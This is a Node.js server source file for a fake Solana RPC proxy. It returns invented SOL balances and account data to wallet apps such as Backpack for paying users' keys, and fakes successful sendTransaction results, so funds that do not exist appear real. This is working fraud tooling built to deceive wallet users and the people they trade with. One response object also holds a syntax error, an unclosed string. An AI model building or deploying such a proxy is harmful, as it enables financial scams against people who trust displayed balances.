require('dotenv').config();
const express = require('express');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();

const app = express();
app.use(express.json({ limit: '10mb' }));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', '*');
  next();
});

const REAL_RPC = 'https://api.mainnet-beta.solana.com';
const db = new sqlite3.Database('crucible.db');

const virtualSol = new Map();

function loadVirtualBalances() {
  db.all(`SELECT publicKey, balance FROM users WHERE paid=1 AND failed=0`, (err, rows) => {
    virtualSol.clear();
    if (!err && rows) {
      rows.forEach(r => r.publicKey && virtualSol.set(r.publicKey, Number(r.balance)));
    }
    console.log(`Virtual balances loaded: ${virtualSol.size} accounts`);
  });
}

loadVirtualBalances();
setInterval(loadVirtualBalances, 12000);

app.post('/', async (req, res) => {
  const { method, params = [], id } = req.body || {};
  const pubkey = params[0]?.toString() || params[0];

  try {
    // 1. FAKE SOL BALANCE
    if (method === 'getBalance' && virtualSol.has(pubkey)) {
      const lamports = Math.floor(virtualSol.get(pubkey) * 1_000_000_000);
      return res.json({
        jsonrpc: '2.0',
        id: req.body.id,
        result: { context: { slot: 999999999 }, value: lamports }
      });
    }

    // 2. FAKE ACCOUNT INFO (Backpack needs this or it crashes)
    if (method === 'getAccountInfo' && virtualSol.has(pubkey)) {
      const lamports = Math.floor(virtualSol.get(pubkey) * 1_000_000_000);
      return res.json({
        jsonrpc: '2.0,
        id: req.body.id,
        result: {
          context: { slot: 999999999 },
          value: {
            lamports,
            owner: "11111111111111111111111111111111",
            executable: false,
            rentEpoch: 999999999,
            data: ["", "base64"],
            space: 0
          }
        }
      });
    }

    // 3. FAKE TOKEN ACCOUNTS (this is the one that fixes "Something went wrong")
    if (method === 'getTokenAccountsByOwner' && virtualSol.has(pubkey)) {
      return res.json({
        jsonrpc: '2.0',
        id: req.body.id,
        result: {
          context: { slot: 999999999 },
          value: [] // empty token list is fine – Backpack just wants the field
        }
      });
    }

    // 4. FAKE sendTransaction (so user doesn’t get errors when trying to trade)
    if (method === 'sendTransaction') {
      return res.json({
        jsonrpc: '2.0',
        id: req.body.id,
        result: '1111111111111111111111111111111111111111111111111111111111111111'
      });
    }

    // Everything else → forward to real RPC (signature lookups, recent blocks, etc.)
    const r = await axios.post(REAL_RPC, req.body, { timeout: 15000 });
    res.json(r.data);

  } catch (e) {
    console.error('RPC error:', e.message);
    res.json({ jsonrpc: '2.0', id: req.body.id, error: { code: -32603, message: 'Internal error' } });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('FAKE SOL RPC PROXY → LIVE AND BULLETPROOF');
  console.log(`RPC URL → ${process.env.RPC_URL || 'https://your-rpc.onrender.com'}`);
});
